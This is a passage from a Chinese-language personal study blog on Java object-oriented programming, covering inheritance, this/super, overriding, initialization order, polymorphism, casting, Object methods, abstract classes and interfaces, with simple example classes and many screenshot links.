void main(String[] args) &#123;        Staff num1 = new Staff();        num1.setinfo(123,&quot;sakura&quot;,&#39;男&#39;,20000);        num1.getinfo();        Staff num2 = new Staff(666,&quot;Alice&quot;,&#39;女&#39;,10000);        num2.getinfo();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304012001796.png" alt="image-20220304012001796"></p><h2 id="标准javabean"><a href="#标准javabean" class="headerlink" title="标准javabean"></a>标准javabean</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093001246.png" alt="image-20220304093001246"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093017092.png" alt="image-20220304093017092"></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093913672.png" alt="image-20220304093913672"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304094152414.png" alt="image-20220304094152414"></p><p>1、使用继承要借用关键字extends</p><p>2、语法结构</p><pre><code class="java">[权限修饰符] 子类 extends 父类&#123;&#125;</code></pre><p>3、当子类继承父类后就可以使用父类的资源</p><p>范例:</p><p>父类:</p><pre><code class="java">package com.sakura.jicheng;public class Animal &#123;    private String name;    private int age;    void setname(String name)&#123;        this.name = name;    &#125;    void setAge(int age)&#123;        this.age = age;    &#125;    void eat()&#123;        System.out.println(this.name+&quot;正在吃饭&quot;);    &#125;    int getinfo_age()&#123;        return this.age;    &#125;    String getinfo_name()&#123;        return this.name;    &#125;&#125;</code></pre><p>Cat类</p><pre><code class="java">package com.sakura.jicheng;public class Cat extends Animal&#123;    void miao()&#123;        System.out.println(&quot;miao~miao~miao~&quot;);    &#125;&#125;</code></pre><p>Dog类</p><pre><code class="java">package com.sakura.jicheng;public class Dog extends Animal&#123;    void wang()&#123;        System.out.println(&quot;wang wang wang&quot;);    &#125;&#125;</code></pre><p>Test类</p><pre><code class="java">package com.sakura.jicheng;public class Test &#123;    public static void main(String[] args) &#123;        Cat cat = new Cat();        cat.setAge(8);        cat.setname(&quot;咪咪&quot;);        System.out.println(cat.getinfo_age());        System.out.println(cat.getinfo_name());        cat.miao();        Dog dog = new Dog();        dog.setAge(10);        dog.setname(&quot;大白&quot;);        System.out.println(dog.getinfo_age());        System.out.println(dog.getinfo_name());        dog.wang();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304130800705.png" alt="image-20220304130800705"></p><h2 id="当出现同名变量时：this与super"><a href="#当出现同名变量时：this与super" class="headerlink" title="当出现同名变量时：this与super"></a>当出现同名变量时：this与super</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304131840347.png" alt="image-20220304131840347"></p><p>super代表从父类继承下来的资源</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304132237877.png" alt="image-20220304132237877"></p><h2 id="继承资源的查找"><a href="#继承资源的查找" class="headerlink" title="继承资源的查找"></a>继承资源的查找</h2><p>父类的方法不能满足子类需求时，要进行方法重写</p><p>子类在使用资源时，优先在本类中查找，当本类中没有时，才去父类中查找，一点一点向上找，直到找到object类</p><p>object类是所有类的父类</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304145340962.png" alt="image-20220304145340962"></p><h2 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h2><p>1、当子类重写父类的方法时，访问权限不能比父类的访问权限更加严格，要&gt;=父类的访问权限</p><p>2、返回值类型</p><p>当父类的返回类型是基本数据类型时，则子类必须与父类保持一致</p><p>当父类的返回类型是引用数据类型时，则子类可以是返回父类，也可以是返回子类</p><p>3、方法重写时，子类的形参必须与父类的形参保持一致，否则就相当于在子类中新增一个方法</p><p>4、子类不能抛出比父类更大的异常</p><h2 id="this详解"><a href="#this详解" class="headerlink" title="this详解"></a>this详解</h2><p>this可以区分局部变量和成员变量</p><p>this可以调用本类中的构造器(是根据数据类型来匹配的，而不是形参名)</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304152113902.png" alt="image-20220304152113902"></p><p>调用另一个构造器时，this必须放在本构造器首行，如本例中</p><pre><code class="java">this(name,age,salary);</code></pre><p>就在首行</p><p>一般都是多参调少参。在本类中，this可省略</p><h2 id="super详谈"><a href="#super详谈" class="headerlink" title="super详谈"></a>super详谈</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304153656976.png" alt="image-20220304153656976"></p><p>每一个构造器首行都会有一个默认的隐藏的super，调用父类无参的构造器</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304154053753.png" alt="image-20220304154053753"></p><p>当这种情况的时候，super是在少参的构造器中,第二个参数构造器的super()自动消失了</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304155540813.png" alt="image-20220304155540813"></p><p>可以使用super()调用父类有参的构造器</p><p>可以使用super.调用父类的属性和方法</p><h2 id="成员变量的赋值方法"><a href="#成员变量的赋值方法" class="headerlink" title="成员变量的赋值方法"></a>成员变量的赋值方法</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160521490.png" alt="image-20220304160521490"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160500362.png" alt="image-20220304160500362"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160942707.png" alt="image-20220304160942707"></p><p>代码块用 {}包裹</p><p>当是这种静态代码块时，代码块只执行一次</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160839692.png" alt="image-20220304160839692"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160744120.png" alt="image-20220304160744120"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160752027.png" alt="image-20220304160752027"></p><p>静态代码块:用于给静态变量进行赋值</p><p>静态代码只会执行一次，再次创建n个对象也不会执行。也是先于构造器执行</p><p>给成员变量赋值方式:</p><p>1.<strong>默认值</strong></p><p>2.<strong>直接赋值</strong></p><p>3.<strong>代码块赋值</strong></p><p>4.<strong>get/set赋值</strong></p><p>5、<strong>构造器赋值</strong></p><p>静态变量不建议采用使用构造器赋值，因为它是属于类的，可以直接 类名.属性进行赋值</p><h1 id="day10-面向对象"><a href="#day10-面向对象" class="headerlink" title="day10 面向对象"></a>day10 面向对象</h1><h2 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306000154596.png" alt="image-20220306000154596"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306001804012.png" alt="image-20220306001804012"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306002346773.png" alt="image-20220306002346773"></p><p>当有子类的初始化时，会先对父类进行初始化，再初始化子类</p><h2 id="类的初始化不含子类"><a href="#类的初始化不含子类" class="headerlink" title="类的初始化不含子类"></a>类的初始化不含子类</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306010601437.png" alt="image-20220306010601437"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306010614896.png" alt="image-20220306010614896"></p><h2 id="实例初始化不含子类"><a href="#实例初始化不含子类" class="headerlink" title="实例初始化不含子类"></a>实例初始化不含子类</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306011526112.png" alt="image-20220306011526112"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306011757666.png" alt="image-20220306011757666"></p><p>每次调用构造器，都会重复执行一次init方法</p><h2 id="类的初始化含子类"><a href="#类的初始化含子类" class="headerlink" title="类的初始化含子类"></a>类的初始化含子类</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306012632684.png" alt="image-20220306012632684"></p><h2 id="混合初始化"><a href="#混合初始化" class="headerlink" title="混合初始化"></a>混合初始化</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306013247338.png" alt="image-20220306013247338"></p><h2 id="多态的初识"><a href="#多态的初识" class="headerlink" title="多态的初识"></a>多态的初识</h2><p>封装：隐藏内部的实习细节，只对外暴露少量接口，供外界访问</p><p>方法：对功能的封装</p><p>类：对方法的封装</p><p>包：对模块的封装</p><hr><p>继承：实现资源的复用</p><p>​              方法属性</p><hr><p>多态：一个对象的多种形态</p><p>作用：可以让代码更加灵活</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110018629.png" alt="image-20220306110018629"></p><p>多态有两种状态(左边编译时状态 = 右边运行时状态)：</p><p>1、编译时状态</p><p>2、运行时状态</p><p>多态创建的对象能够调用什么方法要看编译时状态</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110650725.png" alt="image-20220306110650725"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110802347.png" alt="image-20220306110802347"></p><p>示例代码:</p><p>Animal类</p><pre><code class="java">package com.sakura.duotai;public class Animal &#123;    void eat()&#123;        System.out.println(&quot;吃饭啦~~&quot;);    &#125;&#125;</code></pre><p>Cat类</p><pre><code class="java">package com.sakura.duotai;public class Cat extends Animal&#123;    void eat()&#123;        System.out.println(&quot;猫吃鱼&quot;);    &#125;    void catchMouse()&#123;        System.out.println(&quot;猫抓老鼠&quot;);    &#125;&#125;</code></pre><p>Dog类</p><pre><code class="java">package com.sakura.duotai;public class Dog &#123;    void eat()&#123;        System.out.println(&quot;狗吃骨头&quot;);    &#125;    void lookHome()&#123;        System.out.println(&quot;狗看家&quot;);    &#125;&#125;</code></pre><p>当我们用Animal类去new一个子类对象时，就是多态的一种体现</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113022606.png" alt="image-20220306113022606"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113038273.png" alt="image-20220306113038273"></p><p>如图，输出的是猫重写的eat方法</p><p>但当我们尝试调用cat中其它方法时，就会报错</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113233339.png" alt="image-20220306113233339"></p><pre><code class="java">Animal a = new Cat();/**这里的Animal a 就是编译时状态 new cat(); 是运行时状态多态创建的对象能够调用什么方法要看编译时状态,代码跑起来时对象是谁，要看运行时状态**/</code></pre><h2 id="多态的作用一节省代码量"><a href="#多态的作用一节省代码量" class="headerlink" title="多态的作用一节省代码量"></a>多态的作用一节省代码量</h2><pre><code class="java">package com.sakura.duotai1;public class Programmer &#123;    void eat()&#123;        System.out.println(&quot;程序员 干饭&quot;);    &#125;&#125;class Chinese extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;中国人使用筷子吃饭&quot;);    &#125;    void act()&#123;        System.out.println(&quot;中国人会功夫&quot;);    &#125;&#125;class India extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;印度人使用手吃饭&quot;);    &#125;    void act()&#123;        System.out.println(&quot;印度人摩托车玩的贼6&quot;);    &#125;&#125;class European extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;欧洲人使用刀叉吃饭&quot;);    &#125;    void act()&#123;        System.out.println(&quot;欧洲人喜欢极限运动&quot;);    &#125;&#125;</code></pre><pre><code class="java">package com.sakura.duotai1;public class Test &#123;    public static void main(String[] args) &#123;        Chinese chinese = new Chinese();        India india = new India();        European european = new European();        showEat(chinese);        showEat(india);        showEat(european);    &#125;    public static void showEat(Programmer programmer)&#123;        programmer.eat();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306120428090.png" alt="image-20220306120428090"></p><p>这样写,节省了很多代码量</p><p>由于这里的Programmer programmer 是形参，所以会有</p><p>Programmer programmer = chinese/india/european;</p><p>满足父类的引用指向子类的对象</p><h2 id="多态作用二存储不同类型数据"><a href="#多态作用二存储不同类型数据" class="headerlink" title="多态作用二存储不同类型数据"></a>多态作用二存储不同类型数据</h2><pre><code class="java">package com.sakura.duotai2;public class Animal &#123;    void eat()&#123;        System.out.println(&quot;动物吃饭&quot;);    &#125;&#125;class Dog extends Animal&#123;    void eat()&#123;        System.out.println(&quot;猫吃鱼&quot;);    &#125;&#125;class Cat extends Animal&#123;    void eat()&#123;        System.out.println(&quot;狗吃肉&quot;);    &#125;&#125;</code></pre><pre><code class="java">package com.sakura.duotai2;public class Test &#123;    public static void main(String[] args) &#123;        int [] arr = &#123;10,20,30&#125;;//这是一个数组它只能存储同一种类型数据        Animal [] aniarr = new Animal[2];        Dog dog = new Dog();        Cat cat = new Cat();        aniarr[0] = dog;        aniarr[1] = cat;        for(Animal a:aniarr)&#123;            a.eat();        &#125;    &#125;&#125;</code></pre><p>此处的cat和dog是不同类型的示例对象，但是都放在了同一个数组</p><h2 id="多态应用三方法的返回值"><a href="#多态应用三方法的返回值" class="headerlink" title="多态应用三方法的返回值"></a>多态应用三方法的返回值</h2><p>示例代码:</p><p>Programmer.java</p><pre><code class="java">package com.sakura.duotai3;public class Programmer &#123;    void work()&#123;        System.out.println(&quot;程序员 写代码&quot;);    &#125;&#125;class Chinese extends Programmer&#123;    void work()&#123;        System.out.println(&quot;中国 程序员写代码&quot;);    &#125;&#125;class India extends Programmer&#123;    void work()&#123;        System.out.println(&quot;印度 程序员写代码&quot;);    &#125;&#125;class European extends Programmer&#123;    void work()&#123;        System.out.println(&quot;欧洲 程序员写代码&quot;);    &#125;&#125;</code></pre><p>Guigu.java</p><pre><code class="java">package com.sakura.duotai3;public class Guigu &#123;    public static Programmer produce_Grammer(String country)&#123;        if(&quot;中国&quot;.equals(country))&#123;            return new Chinese();        &#125;else if(&quot;印度&quot;.equals(country))&#123;            return new India();        &#125;else if(&quot;欧洲&quot;.equals(country))&#123;            return new European();        &#125;        return null;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai3;import java.util.Scanner;public class Test &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;请输入您需要的程序员国家:&quot;);        Scanner input = new Scanner(System.in);        String country = input.next();        Programmer programmer = Guigu.produce_Grammer(country);        if (programmer != null) &#123;            programmer.work();        &#125; else &#123;            System.out.println(&quot;还没有此国家程序员&quot;);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306153850750.png" alt="image-20220306153850750"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306153923126.png" alt="image-20220306153923126"></p><h2 id="多态的练习一"><a href="#多态的练习一" class="headerlink" title="多态的练习一"></a>多态的练习一</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306154354906.png" alt="image-20220306154354906"></p><p>Traffic.java</p><pre><code class="java">package com.sakura.duotai4;public class Traffic &#123;    public void drive()&#123;        System.out.println(&quot;交通工具通行&quot;);    &#125;&#125;class Car extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;汽车奔驰在马路上&quot;);    &#125;&#125;class Bike extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;自行车在马路上缓慢的走着&quot;);    &#125;&#125;class Truck extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;货车满载着货物不快不慢的开着&quot;);    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai4;public class Test &#123;    public static void main(String[] args) &#123;        Traffic [] trarr =new Traffic[3];        trarr[0] = new Car();        trarr[1] = new Bike();        trarr[2] = new Truck();        for(Traffic a:trarr)&#123;            a.drive();        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306155645389.png" alt="image-20220306155645389"></p><h2 id="多态的练习二"><a href="#多态的练习二" class="headerlink" title="多态的练习二"></a>多态的练习二</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306155901154.png" alt="image-20220306155901154"></p><p>示例代码:</p><p>Employee.java</p><pre><code class="java">package com.sakura.duotai5;public class Employee &#123;    private String name;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public double earning()&#123;        return 0;    &#125;    public String getinfo()&#123;        return &quot;姓名是:&quot;+name+&quot; ,实发工资&quot;+earning();    &#125;    public Employee()&#123;&#125;;    public Employee(String name) &#123;        this.name = name;    &#125;&#125;</code></pre><p>SalaryEmployee.java</p><pre><code class="java">package com.sakura.duotai5;public class SalaryEmployee extends Employee&#123;    private double salary;    private int workday;    private int offday;    public double getSalary() &#123;        return salary;    &#125;    public void setSalary(double salary) &#123;        this.salary = salary;    &#125;    public int getWorkday() &#123;        return workday;    &#125;    public void setWorkday(int workday) &#123;        this.workday = workday;    &#125;    public int getOffday() &#123;        return offday;    &#125;    public void setOffday(int offday) &#123;        this.offday = offday;    &#125;    public SalaryEmployee()&#123;&#125;;    public SalaryEmployee(double salary, int workday, int offday,String name) &#123;        super(name);        this.salary = salary;        this.workday = workday;        this.offday = offday;    &#125;    @Override    public double earning() &#123;        return (getSalary()-getSalary()/getWorkday()*getOffday());    &#125;&#125;</code></pre><p>Manager.java</p><pre><code class="java">package com.sakura.duotai5;public class Manager extends SalaryEmployee&#123;    private double part;    public double earning()&#123;        return (getSalary()-getSalary()/getWorkday()*getOffday()*(1+part));    &#125;    public Manager()&#123;&#125;    public Manager(double salary, int workday, int offday, String name, double part) &#123;        super(salary, workday, offday, name);        this.part = part;    &#125;&#125;</code></pre><p>HourEmployee.java</p><pre><code class="java">package com.sakura.duotai5;public class HourEmployee extends Employee&#123;    private int hours;    private int hourmoney;    public int getHours() &#123;        return hours;    &#125;    public void setHours(int hours) &#123;        this.hours = hours;    &#125;    public int getHourmoney() &#123;        return hourmoney;    &#125;    public void setHourmoney(int hourmoney) &#123;        this.hourmoney = hourmoney;    &#125;    public double earning()&#123;        return getHours()*getHourmoney();    &#125;    public HourEmployee()&#123;&#125;    public HourEmployee(String name, int hours, int hourmoney) &#123;        super(name);        this.hours = hours;        this.hourmoney = hourmoney;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai5;public class Test &#123;    public static void main(String[] args) &#123;        Employee [] employee = new Employee[5];        SalaryEmployee s1 = new SalaryEmployee(10000,20,5,&quot;蜡笔小新&quot;);        SalaryEmployee s2 = new SalaryEmployee(15000,20,5,&quot;张伟&quot;);        HourEmployee h1 = new HourEmployee(&quot;苦逼打工人&quot;,30,15);        HourEmployee h2 = new HourEmployee(&quot;小王&quot;,50,30);        Manager m1 = new Manager(20000,22,3,&quot;霸道总裁&quot;,0.9);        employee[0] = s1;        employee[1] = s2;        employee[2] = h1;        employee[3] = h2;        employee[4] = m1;        for(Employee a:employee)&#123;            System.out.println(a.getinfo());        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306213734875.png" alt="image-20220306213734875"></p><h2 id="向下转型"><a href="#向下转型" class="headerlink" title="向下转型"></a>向下转型</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306214039535.png" alt="image-20220306214039535"></p><p>多态的向上转型和向下转型都是都是针对于编译时类型 运行时类型从始至终不会发生改变</p><p>父类的引用指向子类的示例 就是向上转型(弊端:无法使用子类独有资源)：</p><pre><code class="java">Animal ani = new Cat();</code></pre><p>向下转型：</p><p>使用子类自己独有的资源时 down casting</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306215605369.png" alt="image-20220306215605369"></p><p>类似于强制类型转换</p><p>向下转型前提：已经完成了向上转型</p><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>判断左边的对象是否属于右边类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306220002482.png" alt="image-20220306220002482"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306220011415.png" alt="image-20220306220011415"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306221125721.png" alt="image-20220306221125721"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306222229248.png" alt="image-20220306222229248"></p><h1 id="day11"><a href="#day11" class="headerlink" title="day11"></a>day11</h1><h2 id="非虚方法"><a href="#非虚方法" class="headerlink" title="非虚方法"></a>非虚方法</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307222921425.png" alt="image-20220307222921425"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307222347375.png" alt="image-20220307222347375"></p><h2 id="native关键字"><a href="#native关键字" class="headerlink" title="native关键字"></a>native关键字</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307224544250.png" alt="image-20220307224544250"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307224944403.png" alt="image-20220307224944403"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307225003737.png" alt="image-20220307225003737"></p><h2 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307225623364.png" alt="image-20220307225623364"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307230404578.png" alt="image-20220307230404578"></p><h2 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307230702220.png" alt="image-20220307230702220"></p><h3 id="to-string"><a href="#to-string" class="headerlink" title="to_string"></a>to_string</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307231033786.png" alt="image-20220307231033786"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307231050043.png" alt="image-20220307231050043"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232014058.png" alt="image-20220307232014058"></p><p>原方法</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232032977.png" alt="image-20220307232032977"></p><p>重写后</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232136187.png" alt="image-20220307232136187"></p><p>直接alt+insert添加即可</p><h3 id="getClass"><a href="#getClass" class="headerlink" title="getClass()"></a>getClass()</h3><p>获取运行时类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232536412.png" alt="image-20220307232536412"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232551295.png" alt="image-20220307232551295"></p><h3 id="finalize"><a href="#finalize" class="headerlink" title="finalize"></a>finalize</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233825712.png" alt="image-20220307233825712"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233742142.png" alt="image-20220307233742142"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233200553.png" alt="image-20220307233200553"></p><h3 id="hashcode"><a href="#hashcode" class="headerlink" title="hashcode"></a>hashcode</h3><p>用于返回当前对象的hash码</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234118067.png" alt="image-20220307234118067"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234327319.png" alt="image-20220307234327319"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234646637.png" alt="image-20220307234646637"></p><p>重写hashcode()方法，尽量让不同对象产生的hash码不一样</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234725681.png" alt="image-20220307234725681"></p><h3 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308000837040.png" alt="image-20220308000837040"></p><p>equals 只能比较引用类型数据</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307235240218.png" alt="image-20220307235240218"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308000516442.png" alt="image-20220308000516442"></p><h2 id="空指针异常"><a href="#空指针异常" class="headerlink" title="空指针异常"></a>空指针异常</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004815978.png" alt="image-20220308004815978"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004823230.png" alt="image-20220308004823230"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004929031.png" alt="image-20220308004929031"></p><h2 id="抽象初识"><a href="#抽象初识" class="headerlink" title="抽象初识"></a>抽象初识</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309001110049.png" alt="image-20220309001110049"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309001857256.png" alt="image-20220309001857256"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003126201.png" alt="image-20220309003126201"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309002153677.png" alt="image-20220309002153677"></p><h2 id="抽象注意点"><a href="#抽象注意点" class="headerlink" title="抽象注意点"></a>抽象注意点</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003553843.png" alt="image-20220309003553843"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003622175.png" alt="image-20220309003622175"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309004543157.png" alt="image-20220309004543157"></p><h2 id="接口初识"><a href="#接口初识" class="headerlink" title="接口初识"></a>接口初识</h2><p>如何声明接口：</p><p>接口：定义规范</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010955198.png" alt="image-20220309010955198"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010752566.png" alt="image-20220309010752566"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010914703.png" alt="image-20220309010914703"></p><p>接口也有多态</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011210309.png" alt="image-20220309011210309"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011357791.png" alt="image-20220309011357791"></p><p>注意：</p><p>接口中的抽象方法默认被 public abstract 修饰</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011610133.png" alt="image-20220309011610133"></p><p>接口中的全局静态常量默认被</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011859135.png" alt="image-20220309011859135"></p><p>这三个修饰</p><p>一个类可以实现多个接口</p><p><img 